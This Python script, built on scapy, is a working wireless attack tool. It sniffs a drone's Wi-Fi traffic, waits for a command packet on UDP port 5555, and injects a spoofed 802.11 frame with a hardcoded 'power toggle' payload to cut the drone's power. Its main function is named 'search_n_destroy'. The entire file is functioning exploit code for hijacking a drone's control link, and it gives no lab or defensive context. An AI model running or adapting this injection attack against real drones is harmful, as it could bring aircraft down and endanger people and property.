#!python
"""
Listen for drone communication and as soon as a command packet is seen,
capture it, change payload to power toggle and send it off.
"""

import pathlib
import queue
import subprocess

import fire
from scapy.layers.dot11 import Dot11, Dot11FCS, Dot11QoS, RadioTap
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import AsyncSniffer, sendp


def sniff_gen(**kwargs):
    pkts = queue.SimpleQueue()
    t = AsyncSniffer(store=False, prn=pkts.put, **kwargs)
    t.start()
    try:
        while True:
            yield pkts.get()
    except KeyboardInterrupt:
        pass
    t.stop()


def setup_monitor(iface: str):
    here = pathlib.Path(__file__).parent
    subprocess.check_call([str(here / "setup_monitor.sh"), iface])


def search_n_destroy(iface: str):
    setup_monitor(iface)
    pkts_stream = sniff_gen(iface=iface)

    for pkt in pkts_stream:
        if UDP in pkt:
            dgram = pkt[UDP]
            if dgram.dport == 5555:

                frame = (
                    RadioTap()
                    / Dot11FCS(
                        subtype=8,
                        type="Data",
                        proto=0,
                        FCfield="to-DS",
                        addr1=pkt[Dot11].addr1,
                        addr2=pkt[Dot11].addr2,
                        addr3=pkt[Dot11].addr3,
                    )
                    / Dot11QoS(Reserved=0, Ack_Policy=0, EOSP=0, TID=0, TXOP=0)
                    / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
                    / SNAP(OUI=0x0, code="IPv4")
                    / IP(version=4, proto="udp", src=pkt[IP].src, dst=pkt[IP].dst)
                    / UDP(sport=6666, dport=5555)
                    / Raw(
                        load=bytes.fromhex(
                            "436d640001001200010404000a000000808080802020202010652f"
                        )
                    )
                )

                sendp(frame, iface=iface)
                break


if __name__ == "__main__":
    fire.Fire(search_n_destroy)
